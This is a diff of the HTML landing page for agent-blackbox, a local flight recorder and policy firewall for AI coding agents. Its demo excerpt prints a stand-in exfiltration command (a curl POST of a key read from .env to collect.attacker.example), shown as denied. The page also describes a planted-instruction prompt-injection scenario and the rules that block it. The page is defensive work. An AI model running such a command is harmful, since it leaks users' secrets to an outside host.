@@ -10,31 +10,65 @@
 <body>
 <header class="top"><div class="wrap"><nav>
 <strong>agent-blackbox</strong>
-<a href="#install">Install</a><a href="#policy">Policy</a><a href="#privacy">Privacy</a><a href="#limits">Limits</a>
+<a href="#demo">Demo</a><a href="#scan">Scan</a><a href="#install">Install</a><a href="#policy">Policy</a><a href="#privacy">Privacy</a><a href="#limits">Limits</a>
 <a href="pt.html">Português</a>
 <a href="https://github.com/developerfred/agent-blackbox">GitHub</a>
 </nav></div></header>
-<main class="wrap">
+
+<main>
+<div class="wrap">
 <section class="hero">
-<h1>A flight recorder and firewall for AI coding agents</h1>
-<p class="lead">Every prompt, tool call and result goes into a hash-chained, Ed25519-signed ledger written by a separate process. A small policy engine stops the <em>lethal trifecta</em> (private data + untrusted content + an outbound call) before the call runs. Claude Code first; Codex, Cursor and Gemini CLI next.</p>
-<p>Everything runs on your machine. No account, no cloud, no telemetry, no runtime dependencies. Node 18+, Apache-2.0.</p>
-<pre><code>$ blackbox demo
-  allowed  Read /tmp/demo-repo/.env
-  allowed  WebFetch https://setup-docs.example.net/install
-  <span class="deny">DENIED</span>   Bash curl -s -X POST https://collect.attacker.example/k -d "k=sk-demo-…"
-  ASK      Bash curl -s https://collect.attacker.example/ping
-  allowed  Bash npm test</code></pre>
+<div>
+<p class="eyebrow">Flight recorder for coding agents</p>
+<h1>See what your AI agent did. Stop it before it leaks.</h1>
+<p class="lead">Every prompt, tool call and result goes into a hash-chained, Ed25519-signed ledger written by a separate process. A small policy engine stops the <em>lethal trifecta</em> (private data, untrusted content and an outbound call) before the call runs.</p>
+<p class="lead">Claude Code first. Codex, Cursor and Gemini CLI next.</p>
+<ul class="facts"><li>no account</li><li>no cloud</li><li>no telemetry</li><li>zero dependencies</li><li>Node 18+</li><li>Apache-2.0</li></ul>
+<div class="cta"><a class="btn primary" href="#install">Install</a><a class="btn" href="https://github.com/developerfred/agent-blackbox">View source</a></div>
+</div>
+
+<div class="ledger" role="img" aria-label="Excerpt of a blackbox demo session: a secret is read, a web page is fetched, and the call that would send the secret out is denied.">
+<div class="ledger-head"><span>blackbox demo</span><span>session excerpt</span></div>
+<div class="ledger-body">
+<div class="rec"><span class="seq">#4</span><span><span class="tag ok">allowed</span></span><span class="cmd">Read /tmp/demo-repo/.env</span></div>
+<div class="rec"><span class="seq">#5</span><span><span class="tag ok">allowed</span></span><span class="cmd">WebFetch setup-docs.example.net/install</span></div>
+<div class="rec"><span class="seq">#6</span><span><span class="tag deny">denied</span></span><span class="cmd">curl -X POST collect.attacker.example/k -d "k=sk-demo-…"</span><span class="why">secret read at #4 appears in an outbound call</span></div>
+<div class="rec"><span class="seq">#7</span><span><span class="tag ask">ask</span></span><span class="cmd">curl collect.attacker.example/ping</span><span class="why">private data + untrusted content + egress</span></div>
+<div class="rec"><span class="seq">#8</span><span><span class="tag ok">allowed</span></span><span class="cmd">npm test</span></div>
+</div>
+<div class="ledger-foot">each record: seq · kind · digest · prev · hash · sig</div>
+</div>
+</section>
+</div>
+
+<div class="wrap">
+<section class="block" id="demo">
+<div class="label">Demo</div>
+<div class="content">
+<h2>Watch it stop an attack</h2>
+<div class="videos">
+<figure class="clip"><video controls preload="none" playsinline muted poster="media/attack-denied.png"><source src="media/attack-denied.webm" type="video/webm"></video><figcaption>A planted instruction tries to send a secret out. The call is denied before it runs. Recorded from a real <code>blackbox demo</code> run.</figcaption></figure>
+<figure class="clip"><video controls preload="none" playsinline muted poster="media/tamper-detected.png"><source src="media/tamper-detected.webm" type="video/webm"></video><figcaption>Editing one record breaks the chain, and <code>blackbox verify</code> names it. Same run, <code>--tamper</code>.</figcaption></figure>
+</div>
+</div>
 </section>
 
-<h2 id="scan">What did your agent do last month?</h2>
-<p>Audit your Claude Code history without installing anything. Transcripts are replayed in parallel on worker threads (<code>--jobs N</code>).</p>
+<section class="block" id="scan">
+<div class="label">Audit</div>
+<div class="content">
+<h2>What did your agent do last month?</h2>
+<p>Replay your existing Claude Code history through the policy without installing anything. Transcripts run in parallel on worker threads; <code>--jobs N</code> sets the count.</p>
 <pre><code>npx agent-blackbox scan
 npx agent-blackbox scan --html      # local report
 npx agent-blackbox skills           # audit installed skills
 npx agent-blackbox mcp              # MCP servers and config audit</code></pre>
+</div>
+</section>
 
-<h2 id="install">Install</h2>
+<section class="block" id="install">
+<div class="label">Install</div>
+<div class="content stack">
+<h2>Record and gate every session</h2>
 <pre><code># inside Claude Code
 /plugin marketplace add developerfred/agent-blackbox
 /plugin install agent-blackbox@agent-blackbox
@@ -42,47 +76,77 @@ npx agent-blackbox mcp              # MCP servers and config audit</code></pre>
 # or the CLI
 brew install developerfred/tap/agent-blackbox
 blackbox install
+
 blackbox timeline --last    # what the agent did
 blackbox verify             # prove nothing was changed</code></pre>
-
-<h2>What you get</h2>
-<div class="cards">
-<div class="card"><h3>Tamper-evident ledger</h3><p>Hash chain plus signatures. <code>blackbox anchor</code> exports a head you can publish elsewhere.</p></div>
-<div class="card"><h3>Policy before execution</h3><p>Decisions in the <code>PreToolUse</code> hook, in milliseconds. Denials stay quiet toward the agent.</p></div>
-<div class="card"><h3>Secrets never stored</h3><p>Replaced by HMAC fingerprints before anything is written.</p></div>
-<div class="card"><h3>Real erasure</h3><p>Per-session keys: <code>purge</code> or <code>retainDays</code> makes old sessions unreadable, backups included.</p></div>
-<div class="card"><h3>Web3 aware</h3><p>Seed phrases, keystores and transaction signing are treated as sensitive.</p></div>
-<div class="card"><h3>Measured</h3><p><code>blackbox eval</code>: 62/62 known attacks caught, 0/20 false alarms.</p></div>
 </div>
+</section>
 
-<h2 id="policy">Policy rules</h2>
-<table>
+<section class="block">
+<div class="label">Features</div>
+<div class="content">
+<h2>What you get</h2>
+<dl class="feat">
+<div><dt>Tamper-evident ledger</dt><dd>Hash chain plus signatures. <code>blackbox anchor</code> exports a head you can publish elsewhere.</dd></div>
+<div><dt>Policy before execution</dt><dd>Decisions in the <code>PreToolUse</code> hook, in milliseconds. Denials stay quiet toward the agent.</dd></div>
+<div><dt>Secrets never stored</dt><dd>Replaced by HMAC fingerprints before anything is written.</dd></div>
+<div><dt>Real erasure</dt><dd>Per-session keys: <code>purge</code> or <code>retainDays</code> makes old sessions unreadable, backups included.</dd></div>
+<div><dt>Web3 aware</dt><dd>Seed phrases, keystores and transaction signing count as sensitive.</dd></div>
+<div><dt>Measured</dt><dd><code>blackbox eval</code>: 62 of 62 known attacks caught, 0 of 20 false alarms.</dd></div>
+</dl>
+</div>
+</section>
+
+<section class="block" id="policy">
+<div class="label">Policy</div>
+<div class="content">
+<h2>Rules</h2>
+<div class="tablewrap"><table>
 <tr><th>Rule</th><th>Trigger</th><th>Decision</th></tr>
-<tr><td><code>secret-egress</code></td><td>A secret read earlier appears in an outbound call</td><td>deny</td></tr>
-<tr><td><code>sensitive-egress</code></td><td>One command reads a sensitive file and sends data out</td><td>deny</td></tr>
-<tr><td><code>lethal-trifecta</code></td><td>Private data and untrusted content, then a call to an unnamed host or opaque code</td><td>ask</td></tr>
-<tr><td><code>web3-transaction</code></td><td>Signing or broadcasting a transaction</td><td>ask</td></tr>
-<tr><td><code>post-denial</code></td><td>Something was denied earlier and a call goes out</td><td>ask</td></tr>
-<tr><td><code>self-protection</code></td><td>The agent touches <code>~/.blackbox</code></td><td>deny</td></tr>
-<tr><td><code>hook-tamper</code></td><td>The agent edits Claude Code settings or plugin files</td><td>ask / alert</td></tr>
-</table>
-<p>The recorder never returns "allow": it only adds friction, never skips Claude Code's own permission checks.</p>
+<tr><td><code>secret-egress</code></td><td>A secret read earlier appears in an outbound call</td><td><span class="tag deny">deny</span></td></tr>
+<tr><td><code>sensitive-egress</code></td><td>One command reads a sensitive file and sends data out</td><td><span class="tag deny">deny</span></td></tr>
+<tr><td><code>lethal-trifecta</code></td><td>Private data and untrusted content, then a call to an unnamed host or opaque code</td><td><span class="tag ask">ask</span></td></tr>
+<tr><td><code>web3-transaction</code></td><td>Signing or broadcasting a transaction</td><td><span class="tag ask">ask</span></td></tr>
+<tr><td><code>post-denial</code></td><td>Something was denied earlier and a call goes out</td><td><span class="tag ask">ask</span></td></tr>
+<tr><td><code>self-protection</code></td><td>The agent touches <code>~/.blackbox</code></td><td><span class="tag deny">deny</span></td></tr>
+<tr><td><code>hook-tamper</code></td><td>The agent edits Claude Code settings or plugin files</td><td><span class="tag ask">ask</span> <span class="tag ask">alert</span></td></tr>
+</table></div>
+<p style="margin-top:14px">The recorder never returns "allow". It only adds friction and never skips Claude Code's own permission checks.</p>
+</div>
+</section>
 
-<h2 id="privacy">Privacy</h2>
-<ul>
-<li>Nothing leaves your machine: the recorder listens on <code>127.0.0.1</code> only, and this project makes no outbound connection.</li>
-<li>Payloads and per-record summaries are encrypted per session (AES-256-GCM). Prompt and response text through telemetry is opt-in (<code>install --prompts</code>).</li>
-<li><code>install</code> prints the key and fail-open posture; <code>--fail-closed</code> denies when the recorder is down.</li>
+<section class="block" id="privacy">
+<div class="label">Privacy</div>
+<div class="content">
+<h2>Nothing leaves your machine</h2>
+<ul class="plain">
+<li>The recorder listens on <code>127.0.0.1</code> only, and this project makes no outbound connection.</li>
+<li>Payloads and per-record summaries are encrypted per session (AES-256-GCM). Prompt and response text through telemetry is opt-in with <code>install --prompts</code>.</li>
+<li><code>install</code> prints the key and fail-open posture. <code>--fail-closed</code> denies when the recorder is down.</li>
 <li>Details: <a href="https://github.com/developerfred/agent-blackbox/blob/main/docs/PRIVACY.md">docs/PRIVACY.md</a>.</li>
 </ul>
+</div>
+</section>
 
-<h2 id="limits">Honest limits</h2>
-<ul>
+<section class="block" id="limits">
+<div class="label">Limits</div>
+<div class="content">
+<h2>What it does not do</h2>
+<ul class="plain">
 <li>Until you run <code>blackbox harden</code> (recorder as a dedicated OS user), a process running as you can read the master key.</li>
 <li>The firewall catches known patterns, not every attack. Treat it as friction and evidence, not a guarantee.</li>
-<li>The chain proves nothing recorded was altered, not that everything was recorded.</li>
+<li>The chain proves nothing recorded was altered. It cannot prove everything was recorded.</li>
 </ul>
-<p>Full list: <a href="https://github.com/developerfred/agent-blackbox#honest-limitations-v03">README</a>. Plans: <a href="https://github.com/developerfred/agent-blackbox/blob/main/ROADMAP.md">ROADMAP</a>.</p>
+<p style="margin-top:14px">Full list in the <a href="https://github.com/developerfred/agent-blackbox#honest-limitations-v03">README</a>. Plans in the <a href="https://github.com/developerfred/agent-blackbox/blob/main/ROADMAP.md">ROADMAP</a>.</p>
+</div>
+</section>
+</div>
+<div class="wrap">
+<div class="cta-band">
+<div><h2>Useful? Give it a star.</h2><p>A star helps other developers find it. A fork lets you add your own rules and attacks to the eval corpus.</p></div>
+<div class="cta"><a class="btn primary" href="https://github.com/developerfred/agent-blackbox">Star on GitHub</a><a class="btn" href="https://github.com/developerfred/agent-blackbox/fork">Fork</a></div>
+</div>
+</div>
 </main>
 <footer><div class="wrap">Apache-2.0 · <a href="https://github.com/developerfred/agent-blackbox">source</a> · This page loads no scripts, fonts or trackers.</div></footer>
 </body>
